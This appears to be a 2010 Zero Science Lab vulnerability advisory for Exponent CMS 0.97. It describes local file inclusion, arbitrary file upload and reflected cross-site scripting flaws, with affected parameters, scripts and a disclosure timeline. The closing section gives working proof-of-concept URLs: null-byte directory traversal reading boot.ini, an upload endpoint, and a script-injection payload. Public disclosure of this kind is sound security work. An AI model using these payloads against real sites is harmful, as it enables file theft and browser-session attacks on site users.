@@ -1,0 +1,185 @@
+Exponent CMS v0.97 Multiple Vulnerabilities
+
+
+Vendor:  OIC Group Inc.
+Product web page: http://www.exponentcms.org
+Affected version: 0.97
+
+Summary: Open Source Content Management System (PHP+MySQL).
+
+Desc: Exponent CMS suffers from multiple vulnerabilities:
+
+#1. Local File Inclusion / File Disclosure Vulnerability
+#2. Arbitrary File Upload / File Modify Vulnerability
+#3. Reflected Cross-Site Scripting Vulnerability
+
+(1) LFI/FD occurs when input passed thru the params:
+- "action"
+- "expid"
+- "ajax_action"
+- "printerfriendly"
+- "section"
+- "module"
+- "controller"
+- "int"
+- "src"
+- "template"
+- "page"
+- "_common"
+
+to the scripts:
+- "index.php"
+- "login_redirect.php"
+- "mod_preview.php"
+- "podcast.php"
+- "popup.php"
+- "rss.php"
+
+is not properly verified before being used to include files.
+This can be exploited to include files from local resources
+with directory traversal attacks and URL encoded NULL bytes.
+
+
+(2) AFU/E occurs due to an error in:
+- "upload_fileuploadcontrol.php"
+- "upload_standalone.php"
+- "manifest.php"
+- "delete.php"
+- "edit.php"
+- "manage.php"
+- "rank_switch.php"
+- "save.php"
+- "view.php"
+- "class.php"
+- "deps.php"
+- "delete_form.php"
+- "delete_process.php"
+- "search.php"
+- "send_feedback.php"
+- "viewday.php"
+- "viewmonth.php"
+- "viewweek.php"
+- "testbot.php"
+- "activate_bot.php"
+- "deactivate_bot.php"
+- "manage_bots.php"
+- "run_bot.php"
+- "class.php"
+- "delete_board.php"
+- "delete_post.php"
+- "edit_board.php"
+- "edit_post.php"
+- "edit_rank.php"
+- "monitor_all_boards.php"
+- "monitor_board.php"
+- "monitor_thread.php"
+- "preview_post.php"
+- "save_board.php"
+- "save_post.php"
+- "save_rank.php"
+- "view_admin.php"
+- "view_board.php"
+- "view_rank.php"
+- "view_thread.php"
+- "banner_click.php"
+- "ad_delete.php"
+- "ad_edit.php"
+- "ad_save.php"
+- "af_delete.php"
+- "af_edit.php"
+- "af_save.php"
+- "delete_article.php"
+- "edit_article.php"
+- "save_article.php"
+- "save_submission.php"
+- "submit_article.php"
+- "view_article.php"
+- "view_submissions.php"
+- "coretasks.php"
+- "htmlarea_tasks.php"
+- "search_tasks.php"
+- "clear_smarty_cache.php"
+- "configuresite.php"
+- "config_activate.php"
+- "config_configuresite.php"
+- "config_delete.php"
+- "config_save.php"
+- "examplecontent.php"
+- "finish_install_extension.php"
+- "gmgr_delete.php"
+- "gmgr_editprofile.php"
+- "gmgr_membership.php"
+- "gmgr_savegroup.php"
+- "gmgr_savemembers.php"
+
+as it allows uploads of files with multiple extensions to a
+folder inside the web root. This can be exploited to execute
+arbitrary PHP code by uploading a specially crafted PHP script.
+
+The uploaded files are stored in: [CMS_ROOT_HOST]\files
+
+
+(3) XSS occurs when input passed to the params:
+- "u"
+- "expid"
+- "ajax_action"
+- "ss"
+- "sm"
+- "url"
+- "rss_url"
+- "lang"
+- "toolbar"
+- "section"
+- "section_name"
+- "src"
+
+in scripts:
+- "slideshow.js.php"
+- "picked_source.php"
+- "magpie_debug.php"
+- "magpie_simple.php"
+- "magpie_slashbox.php"
+- "test.php"
+- "fcktoolbarconfig.js.php"
+- "section_linked.php"
+- "index.php"
+
+is not properly sanitised before being returned to the user.
+This can be exploited to execute arbitrary HTML and script
+code in a user's browser session in context of an affected site.
+
+
+Tested on: Microsoft Windows XP Professional SP3 (English)
+           Apache 2.2.14 (Win32)
+           MySQL 5.1.41
+           PHP 5.3.1
+
+
+Vendor status: [09.10.2010] Vulnerabilities discovered.
+               [10.10.2010] Vendor contacted.
+               [13.10.2010] No reply from vendor.
+               [14.10.2010] Public advisory released.
+
+
+Advisory ID: ZSL-2010-4969
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4969.php
+
+
+Vulnerabilities discovered by: Gjoko 'LiquidWorm' Krstic
+                               liquidworm gmail com
+                               Zero Science Lab - http://www.zeroscience.mk
+
+
+Proofs of Concept:
+
+(1) LFI/FD - http://exponent_site/index.php?action=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00&expid=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00&ajax_action=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00&printerfriendly=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00&section=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00&module=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00&controller=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
+
+...
+
+(2) AFU/E - http://exponent_site/modules/cermi/actions/upload_fileuploadcontrol.php?action=[FILE]&expid=[FILE]&ajax_action=[FILE]
+
+...
+
+(3) XSS - http://exponent_site/external/magpierss/scripts/magpie_slashbox.php?rss_url=3141%3cscript%3ealert("zsl_xss")%3c%2fscript%3e
+
+...
